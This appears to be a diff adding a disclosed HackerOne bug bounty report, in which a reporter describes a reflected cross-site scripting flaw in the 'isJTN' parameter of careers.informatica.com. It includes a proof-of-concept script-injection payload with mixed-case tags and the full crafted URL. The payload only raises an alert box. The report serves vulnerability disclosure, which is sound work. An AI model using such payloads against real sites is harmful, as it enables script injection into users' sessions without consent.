@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/190020
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/modam3rly
+ReportedTo:Informatica(informatica)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:07.04.2017 16:29:46
+
+Summary:
+
+hi ,
+i found XSS bug on parameter  "isJTN=" at careers.informatica.com give you ability to run java script code
+tested on firefox 50.0.2 also on old version of google chrome in the last version , but if try this bug in chrome last version you will got a source code displayed on page with out run cuz security protected stop XSS code 
+
+* POC
+
+used payload   : </ScrIpt><SCRIPT>+alert("X");</SCRIPT>
+
+https://careers.informatica.com/apply?applySource=Quick%20Apply&isJTN=</ScrIpt><SCRIPT>+alert("X");</SCRIPT>true&isQuickApply=false
+
+are this eligible for swag !?
+cheer
